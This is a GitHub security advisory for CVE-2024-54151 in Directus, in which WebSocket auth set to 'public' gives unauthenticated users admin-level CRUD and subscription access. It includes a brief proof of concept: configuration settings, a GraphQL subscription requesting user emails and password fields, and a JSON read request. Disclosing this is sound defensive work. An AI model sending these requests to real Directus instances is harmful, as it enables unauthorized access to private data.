# [H] Directus allows unauthenticated access to WebSocket events and operations

## Summary
Severity: High
Advisory: GHSA-849r-qrwj-8rv4
CVE: CVE-2024-54151
CWE: CWE-200
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2024-12-09
Source: https://github.com/advisories/GHSA-849r-qrwj-8rv4
Type: github-advisory

## Affected
- npm: `directus` — affected >=11.0.0 <11.3.0
- npm: `@directus/api` — affected >=22.2.0 <23.2.0

## Details
### Summary
When setting `WEBSOCKETS_GRAPHQL_AUTH` or `WEBSOCKETS_REST_AUTH` to "public", an unauthenticated user is able to do any of the supported operations (CRUD, subscriptions) with full admin privileges.

### Details
Accountability for unauthenticated WebSocket requests is set to null, which used to be "public permissions" until the Permissions Policy update which now defaults that to system/admin level access. So instead of null we need to make use of `createDefaultAccountability()` to ensure public permissions are used for unauthenticated users.

### PoC
1. Start directus with
```bash
WEBSOCKETS_ENABLED=true
WEBSOCKETS_GRAPHQL_AUTH=public
WEBSOCKETS_REST_AUTH=public
```

2. Subscribe using GQL or REST or do any CRUD operation on a user created collection (system tables are not reachable with crud)
```gql
subscription {
    directus_users_mutated {
        key
        event
        data {
            id
            email
            first_name
            last_name
            password
        }
    }
}
```
or
```json
{
   "type": "items",
   "action": "read",
   "collection": "your_collection_name"
}
```
3a. Open up the data studio as any user. Observe how the subscriber gets notified on each page navigation (because the users `last_page` gets updated, the `password` fields is properly redacted here)

3b. Observe receiving all available items from the `your_collection_name` collection.

### Impact

This impacts any Directus instance that has either `WEBSOCKETS_GRAPHQL_AUTH` or `WEBSOCKETS_REST_AUTH` set to `public` allowing unauthenticated users to subscribe for changes on any collection or do REST CRUD operations on user defined collections ignoring permissions.

## References
- https://github.com/directus/directus/security/advisories/GHSA-849r-qrwj-8rv4
- https://nvd.nist.gov/vuln/detail/CVE-2024-54151
- https://github.com/directus/directus/commit/ce0397d16cf767b5293cd57f626c5349b5732a21
- https://github.com/directus/directus
